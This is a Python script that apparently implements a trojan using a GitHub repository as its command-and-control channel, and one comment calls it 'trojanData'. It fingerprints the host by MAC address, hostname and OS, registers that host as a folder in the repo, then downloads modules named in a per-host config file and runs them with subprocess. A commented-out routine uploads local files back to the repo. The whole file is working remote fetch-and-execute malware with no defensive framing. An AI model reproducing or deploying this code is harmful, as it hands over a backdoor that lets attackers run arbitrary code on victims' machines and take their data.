from github import Github
import os
from dotenv import load_dotenv, set_key
import uuid
import socket
import platform
import requests
import subprocess


def create_folder(folder_path, commit_message, branch):
    # Create an empty file inside the folder to create the folder
    folder_name = folder_path.strip('/').split('/')[-1]  # Get the last folder name from the path
    empty_file_path = f"{folder_path}/config.json"  # Create a placeholder empty file to create the folder

    # Check if the folder already exists in the target branch
    try:
        contents = repo.get_contents(empty_file_path, ref=branch)
        print(f"Folder {folder_path} already exists on branch {branch}.")
    except Exception as e:
        # If the folder doesn't exist, create it by creating an empty file
        content = "{\n\t\"modules\": \"none\"\n}"
        repo.create_file(empty_file_path, commit_message, content, branch=branch)
        print(f"Created folder {folder_path} on branch {branch}.")

def get_Config(access_token, repo_name, folder_path, branch="data"):
    folder_path = folder_path+"/config.json"
    headers = {
        "Authorization": f"token {access_token}"
    }
    url = f"https://api.github.com/repos/{repo_name}/contents/{folder_path}?ref={branch}"
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        download_url = response.json().get("download_url")
        if download_url:
            file_response = requests.get(download_url)
            return file_response.json()
        

def dowload_Module(access_token, repo_name, folder_path,module_name, branch):

    headers = {
        "Authorization": f"token {access_token}"
    }
    url = f"https://api.github.com/repos/{repo_name}/contents/{folder_path}/{module_name}?ref={branch}"
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        download_url = response.json().get("download_url")
        if download_url:
            file_response = requests.get(download_url)
            with open(module_name, "w") as file:
                    file.write(file_response.text)



# # Function to upload a file
# def upload_file(file_path, commit_message, folder_path, branch):    #upload_file(file_hier,commit_message, plaats_het_hier, op deze branch)
#     with open(file_path, "r") as file:
#         content = file.read()

#     # Target file path in the repository
#     file_name = file_path.split("\\")[-1]
#     git_path = f"{folder_path}/{file_name}"

#     # Check if the file exists in the target branch
#     try:
#         contents = repo.get_contents(git_path, ref=branch)
#         # If file exists, update it
#         repo.update_file(contents.path, commit_message, content, contents.sha, branch=branch)
#         # print(f"Updated {git_path} on branch {branch}.")
#     except Exception as e:
#         # If file doesn't exist, create it
#         repo.create_file(git_path, commit_message, content, branch=branch)
#         # print(f"Created {git_path} on branch {branch}.")

load_dotenv(dotenv_path='./.env',override=True)
FIRST_RUN = os.getenv('FIRST_RUN')
if FIRST_RUN == "True":
    # print("hello")
    set_key('.env',"FIRST_RUN","False")
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8 * 6, 8)][::-1])
    hostname = socket.gethostname()
    os_name = platform.system()
    pc_id = mac_address +"_"+ hostname +"_"+ os_name
    set_key('.env',"PC_ID",pc_id)

    ACCESS_TOKEN = os.getenv('ACCESS_TOKEN')
    REPO_NAME = os.getenv('REPO_NAME')
    BRANCH = "data"
    FOLDER_PATH = pc_id
    g = Github(ACCESS_TOKEN)
    repo = g.get_repo(REPO_NAME)
    # file_path = "trojanData\\test.txt"
    commit_message = f"Added data from {pc_id}"
    create_folder(pc_id,commit_message,BRANCH)
    # upload_file(file_path, commit_message, FOLDER_PATH, BRANCH)


else:
    ACCESS_TOKEN = os.getenv('ACCESS_TOKEN')
    BRANCH = "data"
    REPO_NAME = os.getenv('REPO_NAME')
    FOLDER_PATH = os.getenv('PC_ID')

    modules = get_Config(ACCESS_TOKEN, REPO_NAME, FOLDER_PATH, BRANCH)['modules']
    for module in modules:
        dowload_Module(ACCESS_TOKEN, REPO_NAME, "modules",module, "main")
        subprocess.run(["python", module])